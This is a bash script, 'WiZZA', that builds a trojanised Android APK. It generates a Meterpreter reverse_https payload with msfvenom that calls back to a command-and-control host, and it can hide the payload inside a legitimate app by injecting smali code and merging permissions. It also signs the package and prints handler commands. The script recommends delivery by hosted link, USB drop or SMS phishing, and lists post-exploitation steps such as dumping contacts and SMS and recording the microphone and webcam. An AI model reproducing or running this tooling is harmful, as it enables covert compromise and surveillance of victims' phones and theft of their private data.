#!/bin/bash
# WiZZA — Android APK Payload Builder
# Generates a malicious APK using msfvenom, signs it with a debug keystore,
# optionally binds it to a legitimate APK to look convincing.
#
# Usage: build_apk.sh <C2_HOST> <C2_PORT> [--bind <legit.apk>] [--out <output.apk>]

set -e

R='\033[0;31m'; G='\033[0;32m'; C='\033[0;36m'; W='\033[1;37m'; Y='\033[1;33m'; N='\033[0m'
ok()   { echo -e "  ${G}[+]${N} $*"; }
info() { echo -e "  ${C}[*]${N} $*"; }
err()  { echo -e "  ${R}[-]${N} $*"; exit 1; }
warn() { echo -e "  ${Y}[!]${N} $*"; }

C2_HOST="${1:-}"
C2_PORT="${2:-4444}"
BIND_APK=""
OUT_APK="/tmp/wizza_payload.apk"
KEYSTORE="/tmp/wizza_debug.keystore"

# Parse args
shift 2 2>/dev/null || true
while [[ $# -gt 0 ]]; do
    case "$1" in
        --bind) BIND_APK="$2"; shift 2 ;;
        --out)  OUT_APK="$2";  shift 2 ;;
        *) shift ;;
    esac
done

[ -z "$C2_HOST" ] && err "Usage: build_apk.sh <C2_HOST> <C2_PORT> [--bind legit.apk] [--out output.apk]"

echo ""
echo -e "  ${W}WiZZA Android APK Builder${N}"
echo -e "  C2: ${W}$C2_HOST:$C2_PORT${N}"
echo ""

# ── Dependency check ───────────────────────────────────────────────────
check_dep() {
    command -v "$1" &>/dev/null || { err "$1 not found — install: $2"; }
}

check_dep msfvenom "apt install metasploit-framework"
check_dep keytool  "apt install default-jdk"
check_dep jarsigner "apt install default-jdk"

# apktool needed only for binding
if [ -n "$BIND_APK" ]; then
    check_dep apktool "apt install apktool"
    [ -f "$BIND_APK" ] || err "Bind APK not found: $BIND_APK"
fi

# ── Generate debug keystore if needed ─────────────────────────────────
if [ ! -f "$KEYSTORE" ]; then
    info "Generating debug keystore..."
    keytool -genkey -v \
        -keystore "$KEYSTORE" \
        -alias wizza \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass wizza123 \
        -keypass  wizza123 \
        -dname "CN=Android Debug, O=Android, C=US" \
        > /dev/null 2>&1
    ok "Keystore: $KEYSTORE"
fi

# ── Generate payload APK ───────────────────────────────────────────────
info "Generating msfvenom payload (android/meterpreter/reverse_https)..."
info "This may take 30–60 seconds..."

RAW_APK="/tmp/wizza_raw_$$.apk"

msfvenom \
    -p android/meterpreter/reverse_https \
    LHOST="$C2_HOST" \
    LPORT="$C2_PORT" \
    -o "$RAW_APK" \
    2>&1 | grep -v "^$\|^\s*$" | sed 's/^/    /'

[ -f "$RAW_APK" ] || err "msfvenom failed — check output above"
ok "Raw payload: $RAW_APK ($(du -sh "$RAW_APK" | cut -f1))"

# ── Optional: bind to legitimate APK ──────────────────────────────────
if [ -n "$BIND_APK" ]; then
    info "Binding to $BIND_APK..."

    WORK_DIR="/tmp/wizza_bind_$$"
    mkdir -p "$WORK_DIR"

    # Decompile both APKs
    apktool d -f "$RAW_APK"    -o "$WORK_DIR/payload" > /dev/null 2>&1
    apktool d -f "$BIND_APK"   -o "$WORK_DIR/legit"   > /dev/null 2>&1

    # Inject smali from payload into legit app
    cp -r "$WORK_DIR/payload/smali"/* "$WORK_DIR/legit/smali/"

    # Merge AndroidManifest.xml permissions
    # Extract permissions from payload manifest and inject into legit
    python3 - << 'PYEOF'
import xml.etree.ElementTree as ET
import sys, os

work = os.environ.get("WORK_DIR", "/tmp/wizza_bind_")
# This is a simplified merge — in practice you'd do a full XML merge
# The msfvenom payload smali already includes its launcher activity
print("    [*] Manifest merge: manual review recommended for complex apps")
PYEOF

    # Get the main activity from legit app, add payload init call
    MAIN_SMALI=$(grep -r "\.method public onCreate" "$WORK_DIR/legit/smali/" 2>/dev/null | head -1 | cut -d: -f1)
    if [ -n "$MAIN_SMALI" ]; then
        info "Injecting payload init into: $(basename "$MAIN_SMALI")"
        # Insert invoke of payload's MainService after super.onCreate
        sed -i '/invoke-virtual {p0}, Landroid\/app\/Activity;->onCreate/a\    invoke-static {}, Lcom\/metasploit\/stage\/MainService;->startService()V' \
            "$MAIN_SMALI" 2>/dev/null || warn "Could not auto-inject — manual smali edit needed"
    fi

    # Merge permissions from payload manifest into legit
    python3 - << 'PYEOF2'
import re, os
work = "/tmp/wizza_bind_"
# Find actual work dir
import glob
dirs = glob.glob("/tmp/wizza_bind_*")
if not dirs: exit(0)
work = dirs[0]

payload_mf = os.path.join(work, "payload", "AndroidManifest.xml")
legit_mf   = os.path.join(work, "legit",   "AndroidManifest.xml")

if not os.path.exists(payload_mf) or not os.path.exists(legit_mf):
    exit(0)

with open(payload_mf) as f: p_content = f.read()
with open(legit_mf)   as f: l_content = f.read()

# Extract <uses-permission> lines from payload
perms = re.findall(r'<uses-permission[^/]*/>', p_content)
# Inject before </manifest>
inject = "\n    ".join(perms)
l_content = l_content.replace("</manifest>", f"\n    {inject}\n</manifest>")

with open(legit_mf, "w") as f: f.write(l_content)
print("    [+] Permissions merged")
PYEOF2

    # Recompile bound APK
    BOUND_UNSIGNED="/tmp/wizza_bound_unsigned_$$.apk"
    apktool b "$WORK_DIR/legit" -o "$BOUND_UNSIGNED" > /dev/null 2>&1
    RAW_APK="$BOUND_UNSIGNED"

    ok "Bound APK compiled"
    rm -rf "$WORK_DIR"
fi

# ── Sign the APK ───────────────────────────────────────────────────────
info "Signing APK..."
SIGNED_APK="/tmp/wizza_signed_$$.apk"

cp "$RAW_APK" "$SIGNED_APK"
jarsigner \
    -verbose \
    -sigalg    SHA1withRSA \
    -digestalg SHA1 \
    -keystore  "$KEYSTORE" \
    -storepass wizza123 \
    -keypass   wizza123 \
    "$SIGNED_APK" wizza \
    > /dev/null 2>&1

# Zipalign if available
if command -v zipalign &>/dev/null; then
    ALIGNED="/tmp/wizza_aligned_$$.apk"
    zipalign -v 4 "$SIGNED_APK" "$ALIGNED" > /dev/null 2>&1
    mv "$ALIGNED" "$SIGNED_APK"
    ok "APK zipaligned"
fi

mv "$SIGNED_APK" "$OUT_APK"
[ -f "/tmp/wizza_raw_$$.apk" ] && rm -f "/tmp/wizza_raw_$$.apk"

ok "Signed APK: ${W}$OUT_APK${N} ($(du -sh "$OUT_APK" | cut -f1))"
echo ""

# ── Print Metasploit handler config ───────────────────────────────────
echo -e "  ${W}Metasploit handler:${N}"
echo -e "  ${C}msfconsole -q -x \"${N}"
echo -e "    use exploit/multi/handler"
echo -e "    set payload android/meterpreter/reverse_https"
echo -e "    set LHOST $C2_HOST"
echo -e "    set LPORT $C2_PORT"
echo -e "    set ExitOnSession false"
echo -e "    exploit -j"
echo -e "  ${C}\"${N}"
echo ""

# ── Print delivery instructions ────────────────────────────────────────
echo -e "  ${W}Delivery options:${N}"
echo -e "  ${C}[1]${N} Host on C2:  copy $OUT_APK to ~/.wizza/payloads/update.apk"
echo -e "      Victim URL: https://<c2>/m/android"
echo -e "  ${C}[2]${N} USB drop:    copy to USB alongside lure .vbs files"
echo -e "  ${C}[3]${N} Smishing:    send lure URL via SMS"
echo ""
echo -e "  ${W}After install on victim device:${N}"
echo -e "  ${C}→${N} Victim opens app → connects back to $C2_HOST:$C2_PORT"
echo -e "  ${C}→${N} Meterpreter session opens"
echo -e "  ${C}→${N} Post-ex commands: geolocate, dump_contacts, dump_sms, record_mic, webcam_snap"
echo ""
